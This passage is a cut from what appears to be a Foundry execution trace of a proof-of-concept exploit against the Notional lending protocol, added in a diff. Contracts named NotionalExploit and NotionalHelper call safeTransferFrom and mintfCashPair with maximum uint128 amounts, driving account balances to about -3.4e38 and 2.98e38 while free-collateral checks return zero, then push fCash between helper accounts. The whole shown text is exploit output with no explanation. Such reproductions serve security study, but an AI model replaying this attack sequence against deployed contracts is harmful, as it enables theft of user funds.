+    │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   ├─ [19585] 0xd5d8661733106b0a7C982E44a81b7229a9e2dde2::3d627196(00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000a4721117040abf319b954abf13f654505c34920000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a9a0a009800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca000000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
+    │   │   │   │   │   │   ├─ [3079] 0x0A4721117040ABF319b954aBF13F654505C34920::getCashGroups([2]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2356] Portfolios::getCashGroups([2]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 })]
+    │   │   │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 })]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [31546] Escrow::fallback([0, -1, 0, 0]) [staticcall]
+    │   │   │   │   │   │   ├─ [30817] Escrow::convertBalancesToETH([0, -1, 0, 0]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [14594] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [7098] AccessControlledOCR2Aggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x2f07df70723973afe6b9e0bbacdeef8c6390d68608183704ec74ff3df2924f24: 0 → 1
+    │   │   │   │   │   │   @ 0x818fa631464eab31e017193c102dd2084bb0553ec731442b564ecf09be892c7c: 0 → 1
+    │   │   │   │   │   │   @ 0x2c705c7563b37d22e1d7fb57269987295b45abab5751ad8fd44947f00c14ed22: 0 → 0x00000000000000000000000000000000000000013b9aca00a86a9a0a00000002
+    │   │   │   │   │   │   @ 0x7ba21066518e24c191f43be56519adec974f6d39f5a2b928a86018b1377329b9: 0 → 0x00000000000000000000000000000000000000013b9aca00986a9a0a00000002
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ emit TransferSingle(operator: NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], from: NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], to: NotionalHelper: [0x5872B67d58CeF954B52dEb8E97f9F614BB12fa3d], id: 144115645926736040 [1.441e17], value: 1)
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   ├─ [120204] Notional1155::safeTransferFrom(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], 144115647917392040 [1.441e17], 340282366920938463463374607431768211455 [3.402e38], 0x)
+    │   │   ├─ [119461] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::safeTransferFrom(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], 144115647917392040 [1.441e17], 340282366920938463463374607431768211455 [3.402e38], 0x) [delegatecall]
+    │   │   │   ├─ [113979] 0x0A4721117040ABF319b954aBF13F654505C34920::mintfCashPair(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], 2, 1796256000 [1.796e9], 340282366920938463463374607431768211455 [3.402e38])
+    │   │   │   │   ├─ [113274] Portfolios::mintfCashPair(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], 2, 1796256000 [1.796e9], 340282366920938463463374607431768211455 [3.402e38]) [delegatecall]
+    │   │   │   │   │   ├─ [3529] Escrow::fallback(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78]) [staticcall]
+    │   │   │   │   │   │   ├─ [2786] Escrow::getBalances(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   ├─ [18226] 0xd5d8661733106b0a7C982E44a81b7229a9e2dde2::3d627196(00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000a4721117040abf319b954abf13f654505c34920000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a9a0a009800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006b10b1009800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca0000000000000000000000000000000000ffffffffffffffffffffffffffffffff) [delegatecall]
+    │   │   │   │   │   │   ├─ [3079] 0x0A4721117040ABF319b954aBF13F654505C34920::getCashGroups([2]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2356] Portfolios::getCashGroups([2]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 })]
+    │   │   │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 })]
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001ffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   ├─ [8484] Escrow::fallback([0, -340282366920938463463374607431768211456 [-3.402e38], 0, 0]) [staticcall]
+    │   │   │   │   │   │   ├─ [7755] Escrow::convertBalancesToETH([0, -340282366920938463463374607431768211456 [-3.402e38], 0, 0]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [2094] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [1098] AccessControlledOCR2Aggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x65e6eaebbe3f298edb91083f5eb26505a82eabc06bfb2a1aa4943749d5f1d63e: 0 → 1
+    │   │   │   │   │   │   @ 0x99e66f0297e61081af56382d6e5047cdacb012311a9fe17f44bfdaa2156955a4: 0 → 0x00000000ffffffffffffffffffffffffffffffff3b9aca00a86b10b100000002
+    │   │   │   │   │   │   @ 0x7ba21066518e24c191f43be56519adec974f6d39f5a2b928a86018b1377329ba: 0 → 0x00000000ffffffffffffffffffffffffffffffff3b9aca00986b10b100000002
+    │   │   │   │   │   │   @ 0x2f07df70723973afe6b9e0bbacdeef8c6390d68608183704ec74ff3df2924f24: 1 → 2
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ emit TransferSingle(operator: NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], from: NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78], to: NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], id: 144115647917392040 [1.441e17], value: 340282366920938463463374607431768211455 [3.402e38])
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   ├─ [40669] 0x0A4721117040ABF319b954aBF13F654505C34920::freeCollateralViewAggregateOnly(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78]) [staticcall]
+    │   │   ├─ [39950] Portfolios::freeCollateralViewAggregateOnly(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78]) [delegatecall]
+    │   │   │   ├─ [3529] Escrow::fallback(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78]) [staticcall]
+    │   │   │   │   ├─ [2786] Escrow::getBalances(NotionalExploit: [0xEc434A2f9B7b93AAD1beD77d6Bc512A75aE90d78]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   ├─ [18226] 0xd5d8661733106b0a7C982E44a81b7229a9e2dde2::3d627196(00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000a4721117040abf319b954abf13f654505c34920000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a9a0a009800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006b10b1009800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca0000000000000000000000000000000000ffffffffffffffffffffffffffffffff) [delegatecall]
+    │   │   │   │   ├─ [3079] 0x0A4721117040ABF319b954aBF13F654505C34920::getCashGroups([2]) [staticcall]
+    │   │   │   │   │   ├─ [2356] Portfolios::getCashGroups([2]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 })]
+    │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 })]
+    │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001ffffffffffffffffffffffffffffffff000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [8484] Escrow::fallback([0, -340282366920938463463374607431768211456 [-3.402e38], 0, 0]) [staticcall]
+    │   │   │   │   ├─ [7755] Escrow::convertBalancesToETH([0, -340282366920938463463374607431768211456 [-3.402e38], 0, 0]) [delegatecall]
+    │   │   │   │   │   ├─ [2094] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   ├─ [1098] AccessControlledOCR2Aggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   └─ ← [Return] 0
+    │   │   └─ ← [Return] 0
+    │   ├─ [130893] NotionalHelper::pushFCash(NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], 144115645926736040 [1.441e17], 69257372677950923155658 [6.925e22])
+    │   │   ├─ [129025] Notional1155::safeTransferFrom(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], 144115645926736040 [1.441e17], 69257372677950923155658 [6.925e22], 0x)
+    │   │   │   ├─ [128282] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::safeTransferFrom(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], 144115645926736040 [1.441e17], 69257372677950923155658 [6.925e22], 0x) [delegatecall]
+    │   │   │   │   ├─ [122800] 0x0A4721117040ABF319b954aBF13F654505C34920::mintfCashPair(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], 2, 1788480000 [1.788e9], 69257372677950923155658 [6.925e22])
+    │   │   │   │   │   ├─ [122095] Portfolios::mintfCashPair(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], 2, 1788480000 [1.788e9], 69257372677950923155658 [6.925e22]) [delegatecall]
+    │   │   │   │   │   │   ├─ [11529] Escrow::fallback(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [10786] Escrow::getBalances(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   ├─ [19376] 0xd5d8661733106b0a7C982E44a81b7229a9e2dde2::3d627196(00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000a4721117040abf319b954abf13f654505c34920000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006b10b100a800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca0000000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a9a0a009800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000eaa731f454f3ce928ca) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [3079] 0x0A4721117040ABF319b954aBF13F654505C34920::getCashGroups([2]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [2356] Portfolios::getCashGroups([2]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 })]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 })]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000e07024b1071fe9632caee3275fa315e60000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [8182] Escrow::fallback([0, 298329352496312526619766614701929338342 [2.983e38], 0, 0]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [7453] Escrow::convertBalancesToETH([0, 298329352496312526619766614701929338342 [2.983e38], 0, 0]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [2094] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [1098] AccessControlledOCR2Aggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0, 119283316734628937043473406716590624 [1.192e35], 0, 0]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 119283316734628937043473406716590624 [1.192e35], 0, 0]
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x65e6eaebbe3f298edb91083f5eb26505a82eabc06bfb2a1aa4943749d5f1d63e: 1 → 2
+    │   │   │   │   │   │   │   @ 0x99e66f0297e61081af56382d6e5047cdacb012311a9fe17f44bfdaa2156955a5: 0 → 0x000000000000000000000eaa731f454f3ce928ca3b9aca00986a9a0a00000002
+    │   │   │   │   │   │   │   @ 0x22acd6d941277221f501835219cb7f1a9b99f20e7fd7c43ca266083a9bfe6d62: 0 → 0x000000000000000000000eaa731f454f3ce928ca3b9aca00a86a9a0a00000002
+    │   │   │   │   │   │   │   @ 0x7754241098d032959d846e9742e35bd26ed43669ba7b2f4c067139de8336e5ee: 0 → 1
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ emit TransferSingle(operator: NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], from: NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], to: NotionalHelper: [0x265ccfF3673bCAb03867988081cd51bFd919C03C], id: 144115645926736040 [1.441e17], value: 69257372677950923155658 [6.925e22])
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   └─ ← [Stop]
+    │   ├─ [168531] NotionalHelper::pushFCash(NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], 216173239964663976 [2.161e17], 1658524864122 [1.658e12])
+    │   │   ├─ [166663] Notional1155::safeTransferFrom(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], 216173239964663976 [2.161e17], 1658524864122 [1.658e12], 0x)
+    │   │   │   ├─ [165920] 0x6F10251649c3d0b545506a5F374B63CcDf18cEaf::safeTransferFrom(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], 216173239964663976 [2.161e17], 1658524864122 [1.658e12], 0x) [delegatecall]
+    │   │   │   │   ├─ [160438] 0x0A4721117040ABF319b954aBF13F654505C34920::mintfCashPair(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], 3, 1788480000 [1.788e9], 1658524864122 [1.658e12])
+    │   │   │   │   │   ├─ [159733] Portfolios::mintfCashPair(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], 3, 1788480000 [1.788e9], 1658524864122 [1.658e12]) [delegatecall]
+    │   │   │   │   │   │   ├─ [3529] Escrow::fallback(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [2786] Escrow::getBalances(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489]) [delegatecall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   │   │   ├─ [29979] 0xd5d8661733106b0a7C982E44a81b7229a9e2dde2::3d627196(00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000a4721117040abf319b954abf13f654505c34920000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006b10b100a800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca0000000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a9a0a009800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000eaa731f454f3ce928ca00000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a9a0a009800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca000000000000000000000000000000000000000000000000000000018227c90e7a) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [4467] 0x0A4721117040ABF319b954aBF13F654505C34920::getCashGroups([2, 3]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [3711] Portfolios::getCashGroups([2, 3]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 }), CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0x918fC5c7Dc1d4aC8F6F3B4D7473153e62c0f045d, currency: 2 })]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 }), CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0x918fC5c7Dc1d4aC8F6F3B4D7473153e62c0f045d, currency: 2 })]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000e07024b1071fe9632caee3275fa315e600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002fffffffffffffffffffffffffffffffffffffffffffffffffffffe7dd836f1860000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   ├─ [36525] Escrow::fallback([0, 298329352496312526619766614701929338342 [2.983e38], -1658524864122 [-1.658e12], 0]) [staticcall]
+    │   │   │   │   │   │   │   ├─ [35796] Escrow::convertBalancesToETH([0, 298329352496312526619766614701929338342 [2.983e38], -1658524864122 [-1.658e12], 0]) [delegatecall]
+    │   │   │   │   │   │   │   │   ├─ [2094] EACAggregatorProxy::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [1098] AccessControlledOCR2Aggregator::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 399837681865727 [3.998e14]
+    │   │   │   │   │   │   │   │   ├─ [14594] 0x986b5E1e1755e3C2440e960477f25201B0a8bbD4::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [7098] 0x26ae9b951F84e6c28f58a92133C30e312D42e0Fe::latestAnswer() [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 399780384091197 [3.997e14]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 399780384091197 [3.997e14]
+    │   │   │   │   │   │   │   │   └─ ← [Return] [0, 119283316734628937043473406716590624 [1.192e35], -928263990084890864833 [-9.282e20], 0]
+    │   │   │   │   │   │   │   └─ ← [Return] [0, 119283316734628937043473406716590624 [1.192e35], -928263990084890864833 [-9.282e20], 0]
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x65e6eaebbe3f298edb91083f5eb26505a82eabc06bfb2a1aa4943749d5f1d63e: 2 → 3
+    │   │   │   │   │   │   │   @ 0x99e66f0297e61081af56382d6e5047cdacb012311a9fe17f44bfdaa2156955a6: 0 → 0x0000000000000000000000000000018227c90e7a3b9aca00986a9a0a00000003
+    │   │   │   │   │   │   │   @ 0xf6dfa4fd6f77b4aec2bca886eca70fdad4d06110264e7b56893c01992493a17b: 0 → 1
+    │   │   │   │   │   │   │   @ 0x420082e35bd584ba6add3a3d3fd6c87eba067b5e776adb9f4ec779d39c5dfefd: 0 → 0x0000000000000000000000000000018227c90e7a3b9aca00a86a9a0a00000003
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ emit TransferSingle(operator: NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], from: NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489], to: NotionalHelper: [0x4a3508C5aC0677325932f3bC786Ae7A1C3e9CAfF], id: 216173239964663976 [2.161e17], value: 1658524864122 [1.658e12])
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Return]
+    │   │   └─ ← [Stop]
+    │   ├─ [59655] 0x0A4721117040ABF319b954aBF13F654505C34920::freeCollateralViewAggregateOnly(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489]) [staticcall]
+    │   │   ├─ [58936] Portfolios::freeCollateralViewAggregateOnly(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489]) [delegatecall]
+    │   │   │   ├─ [3529] Escrow::fallback(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489]) [staticcall]
+    │   │   │   │   ├─ [2786] Escrow::getBalances(NotionalHelper: [0x84A060Ed81316E6741Af216A099cFea8bCDd3489]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   │   └─ ← [Return] [0, 0, 0, 0]
+    │   │   │   ├─ [29979] 0xd5d8661733106b0a7C982E44a81b7229a9e2dde2::3d627196(00000000000000000000000000000000000000000000000000000000000000400000000000000000000000000a4721117040abf319b954abf13f654505c34920000000000000000000000000000000000000000000000000000000000000000300000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006b10b100a800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca0000000000000000000000000000000000ffffffffffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a9a0a009800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca00000000000000000000000000000000000000000000000eaa731f454f3ce928ca00000000000000000000000000000000000000000000000000000000000000030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006a9a0a009800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000003b9aca000000000000000000000000000000000000000000000000000000018227c90e7a) [delegatecall]
+    │   │   │   │   ├─ [4467] 0x0A4721117040ABF319b954aBF13F654505C34920::getCashGroups([2, 3]) [staticcall]
+    │   │   │   │   │   ├─ [3711] Portfolios::getCashGroups([2, 3]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 }), CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0x918fC5c7Dc1d4aC8F6F3B4D7473153e62c0f045d, currency: 2 })]
+    │   │   │   │   │   └─ ← [Return] [CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0xfabCDD7c1C3F7b892De64B2B52C4b786c4436Dba, currency: 1 }), CashGroup({ numMaturities: 2, maturityLength: 7776000 [7.776e6], precision: 1000000000 [1e9], cashMarket: 0x918fC5c7Dc1d4aC8F6F3B4D7473153e62c0f045d, currency: 2 })]
+    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000e07024b1071fe9632caee3275fa315e600000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002fffffffffffffffffffffffffffffffffffffffffffffffffffffe7dd836f1860000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [13525] Escrow::fallback([0, 298329352496312526619766614701929338342 [2.983e38], -1658524864122 [-1.658e12], 0]) [staticcall]
+    │   │   │   │   ├─ [12796] Escrow::convertBalancesToETH([0, 298329352496312526619766614701929338342 [2.983e38], -1658524864122 [-1.658e12], 0]) [delegatecall]
